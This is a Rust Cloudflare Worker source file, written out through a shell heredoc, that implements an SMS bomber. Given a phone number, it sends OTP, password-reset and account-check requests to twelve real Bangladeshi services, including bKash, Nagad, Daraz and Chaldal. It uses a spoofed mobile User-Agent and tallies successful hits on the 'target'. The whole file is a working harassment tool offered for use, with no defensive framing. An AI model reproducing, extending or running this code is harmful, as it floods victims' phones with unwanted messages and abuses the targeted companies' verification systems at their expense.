cat > /mnt/user-data/outputs/send_bombing.rs << 'RUSTEOF'
use worker::*;
use serde_json::{json, Value};

// ── ALLOWED ORIGINS ──
const ALLOWED_ORIGINS: &[&str] = &[
    "https://sms-bomber-it.vercel.app",
    "https://customsms-it.vercel.app",
    "https://smsbomber.introvertboytushar.workers.dev",
];

// ── SECRET TOKEN ──
const SECRET_TOKEN: &str = "DCM_DARK_CYBER_2026";

// ── Origin check ──
pub fn get_allowed_origin(req: &Request) -> String {
    let origin = req.headers()
        .get("origin").unwrap_or(None)
        .or_else(|| req.headers().get("referer").unwrap_or(None))
        .unwrap_or_default();

    ALLOWED_ORIGINS
        .iter()
        .find(|&&o| origin.starts_with(o))
        .map(|s| s.to_string())
        .unwrap_or_else(|| "null".to_string())
}

// ── CORS Headers ──
pub fn cors_headers(origin: &str) -> Headers {
    let mut headers = Headers::new();
    headers.set("Access-Control-Allow-Origin", origin).unwrap();
    headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    headers.set("Access-Control-Allow-Headers", "Content-Type, X-Auth-Token, x-auth-token").unwrap();
    headers.set("Content-Type", "application/json").unwrap();
    headers
}

// ── Main handler ──
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let origin = get_allowed_origin(&req);
    let headers = cors_headers(&origin);

    // OPTIONS
    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }

    // Origin check
    if origin == "null" {
        return Ok(Response::error("Access denied", 403)?.with_headers(headers));
    }

    // GET: Token দাও
    if req.method() == Method::Get {
        let body = json!({"token": SECRET_TOKEN}).to_string();
        return Ok(Response::ok(body)?.with_headers(headers));
    }

    // Token check
    let token = req.headers()
        .get("x-auth-token").unwrap_or(None)
        .unwrap_or_default();

    if token != SECRET_TOKEN {
        return Ok(Response::error("Unauthorized", 401)?.with_headers(headers));
    }

    // POST only
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    // Parse body
    let body: Value = req.json().await.unwrap_or_default();
    let number = body.get("number")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .trim()
        .to_string();

    if number.is_empty() {
        let err = json!({"status": "error", "message": "Number missing"}).to_string();
        return Ok(Response::ok(err)?.with_headers(headers));
    }

    // ── Phone number formats ──
    let bd_no   = number.trim_start_matches('0').to_string();
    let bd_full = format!("880{}", bd_no);
    let plus_bd = format!("+88{}", number);

    // ── API List ──
    let apis: Vec<(&str, &str, Value)> = vec![
        ("Shadhin Music",
         "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
         json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})),

        ("Khaodao",
         "https://api.eat-z.com/auth/customer/app-connect",
         json!({"username": &plus_bd})),

        ("Walton Plaza",
         "https://waltonplaza.com.bd/api/auth/otp/create",
         json!({"auth": {"countryCode": "880", "phone": &bd_no}, "captchaToken": "recapcha"})),

        ("Easy.com.bd",
         "https://core.easy.com.bd/api/v1/forgot-password-otp",
         json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})),

        ("Chaldal",
         "https://chaldal.com/api/OTP/GenerateOTP",
         json!({"phoneNumber": &plus_bd})),

        ("Shajgoj",
         "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
         json!({"phone": &number, "type": "login"})),

        ("Bkash",
         "https://www.bkash.com/api/get-otp",
         json!({"mobile": &number})),

        ("Nagad",
         "https://api.mynagad.com/api/dfs/check-account",
         json!({"accountNumber": &bd_full})),

        ("Pathao Food",
         "https://pathao.com/api/v1/auth/otp",
         json!({"phone": &number, "country_code": "+880"})),

        ("Shohoz",
         "https://shohoz.com/api/v4.0/user/sendOTP",
         json!({"mobile_no": &number})),

        ("Daraz",
         "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
         json!({"mobile": &bd_full, "countryCode": "880", "action": "REGISTER"})),

        ("Sheba.xyz",
         "https://sheba.xyz/api/v2/auth/otp",
         json!({"mobile": &number})),
    ];

    // ── Fire all APIs ──
    let mut success = 0u32;
    let mut failed  = 0u32;
    let mut api_results: Vec<Value> = vec![];

    for (name, url, payload) in apis {
        let mut fetch_init = RequestInit::new();
        fetch_init.with_method(Method::Post);

        let mut req_headers = Headers::new();
        req_headers.set("Content-Type", "application/json").unwrap();
        req_headers.set("User-Agent", "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36").unwrap();
        req_headers.set("Accept", "application/json, text/plain, */*").unwrap();
        fetch_init.with_headers(req_headers);
        fetch_init.with_body(Some(payload.to_string().into()));

        let result = match Request::new_with_init(url, &fetch_init) {
            Ok(api_req) => {
                match Fetch::Request(api_req).send().await {
                    Ok(mut r) => {
                        let status = r.status_code();
                        let ok = status == 200 || status == 201 || status == 202;
                        if ok { success += 1; } else { failed += 1; }
                        json!({"api": name, "status": status, "ok": ok})
                    }
                    Err(_) => { failed += 1; json!({"api": name, "status": 0, "ok": false}) }
                }
            }
            Err(_) => { failed += 1; json!({"api": name, "status": 0, "ok": false}) }
        };

        api_results.push(result);
    }

    let response_body = json!({
        "status":  "executed",
        "target":  number,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results
    }).to_string();

    Ok(Response::ok(response_body)?.with_headers(headers))
}
